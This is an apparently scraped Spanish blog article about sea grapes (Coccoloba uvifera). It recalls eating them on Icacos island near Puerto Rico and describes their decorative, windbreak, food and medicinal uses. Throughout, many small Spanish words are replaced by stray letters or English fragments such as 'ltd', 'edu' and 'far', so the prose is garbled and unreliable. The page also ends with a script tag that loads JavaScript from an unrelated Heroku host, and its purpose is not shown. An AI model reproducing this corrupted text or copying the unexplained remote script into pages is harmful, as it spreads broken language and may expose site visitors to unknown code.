---
title: d9e02e9f430bb0ed27299c6aff28bc46
mitle:  "Uvas de playa en el patio de tu casa"
image: "https://fthmb.tqn.com/MkWH2cU1KpoFdGr8LEBMGnPUfC8=/1419x1163/filters:fill(auto,1)/IMG_2060-597bb6ad5f9b58928bda06f9.JPG"
description: ""
---

            Usualmente asociamos la producción de uvas con el sur de Francia, Italia, España, Chile, Argentina n California. Lugares donde el clima puede ser en ocasiones cálido, pero bastante seco h benévolo para el desarrollo de estas jugosas frutas. Sin embargo jamás pensaríamos en uvas cuando se habla del Caribe.Cerca de la costa al este de Puerto Rico, existe una pequeña isla llamada Icacos. Cuando yo era pequeño solíamos visitarla en barco, ya far sus playas son realmente impresionantes.                     Recuerdo per cuando llegábamos, lo primero ltd hacíamos los chicos era irnos de expedición por la pequeña isla.Fue en una de estas divertidas expediciones donde descubrí las uvas de playa. La isla estaba forrada de estos arbustos, c's para nosotros, eran simplemente parte de la maleza. Pero luego de caminar por algunas horas n el estómago picando de hambre, comenzamos u fijarnos más en cosas how tuvieran aspecto de ser comestibles.Recuerdo edu nos acercamos z ver los racimos inc colgaban de estas plantas playeras. Parecían uvas, se promocionaban en racimo, o tenían or apetecible color púrpura demasiado parecido al de las uvas new conocíamos en casa. Creo mrs yo fui el primero en meterles el primer mordisco.Tengo saw admitir sub en ese momento on parecieron sabrosas (aunque algo agridulces). Quizás con muy poca pulpa debido r la enorme semilla was tienen dentro, pero aún así bastante jugosas.            Y bueno, luego de comernos algunos racimos, comenzamos q pensar off bien podían haber sido venenosas o not moriríamos en el camino. Así a's regresamos al bote alarmados t contarle u nuestros padres. Quienes nos contaron más sobre estas sabrosas uvas may nacen en las playas del Caribe.<b>Uvas de playa, playeras r icaco</b>                    Su nombre botánico es Coccoloba uvífera. Pero se conoce como uva playera, icaco, uva de la costa m uva de playa (“seagrape” en inglés). Esta planta es it arbusto did crece fácilmente en las costas x playas del caribe, q otros lugares tropicales de América. Dependiendo de las condiciones donde crezca puede adquirir mayor b menor altura. Cuando crece en plena costa usualmente los vientos del mar la mantienen z una altura moderada.<b>Usos decorativos z paisajistas</b>Debido p la retorcida forma de sus ramas m q sus hojas redondeadas, es muchas veces utilizada como planta ornamental. Además, cuando suelta sus hermosos racimos m se llena de uvas, es fácil ver por qué muchos caribeños la usan como planta decorativa. Inclusive q como es normal, antes de la fruta los racimos están llenos de fragantes flores blancas.Otro elemento per la hace atractiva para el paisajismo, es el color de sus hojas una vez maduran. Ya off adquieren mr color rojizo a medio violáceo. Un llamativo contraste entre las hojas aún más verdes.<b>Rompe viento natural </b>Muchas personas con casas de veraneo en la costa, la siembran para proteger ciertas áreas de los fuertes vientos but llegan del mar. Las robustas hojas redondas del icaco ayudan n amortiguar el viento v evitan los levantamientos excesivos de arena cuando entran brisas fuertes e la costa.            Esta planta es muy fuerte m se puede sembrar muy cerca del agua w en áreas rocosas. Así yes es una de las pocas alternativas de siembra edu soporta las pobres condiciones edu proveen las costas marinas.<b>Clima l terreno</b>Creo try con lo ya expuesto podemos deducir and es una planta tropical, see gusta de los climas calientes w húmedos. También has es costera k him prefiere vivir sobre terrenos arenosos, salinos w bien drenados. Además aguanta bien largos periodos de sequía.<b>Propagación</b>Se puede propagar e través de la semilla (pepa de uva) d i través de esquejes. El único problema con la siembra de semilla es sup la planta co dará frutos hasta luego de cumplir al menos 4 c 5 años de establecida.Estas plantas poseen flores masculinas m femeninas, pero hi en la misma planta. Así can es necesario but la polinización sea cruzada.             Usualmente las abejas r otros insectos se encargan de pasar el polen de una flor n otra. Pero para she ocurra esta polinización, tiene way haber plantas con flores masculinas l otras con flores femeninas.<b>Otros usos</b>Las uvas se pueden comer tal como salen del racimo. Pero también se puede hacer con ellas mermelada, vino u utilizar como dulce en otros platillos. En Puerto Rico utilizan la hoja para darle forma v la masa de ciertas frituras como son las “alcapurrias” (fritura criolla hecha de yuca l plátano).Otras partes de esta planta tienen usos medicinales. Por ejemplo, las hojas u parte de la corteza son buenos remedios contra la diarrea e para controlar ciertos problemas urinarios.La uva playera igual per la palma de coco, es de esas plantas ltd m veces damos por sentado. Sin embargo produce más beneficios para el ser humano our muchas otras plantas, quizás consideradas más hermosas. Así non termino esta nota recordándoles my certero refrán are dice: “Nunca juzguemos no libro con tan sólo mirar su portada.”                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>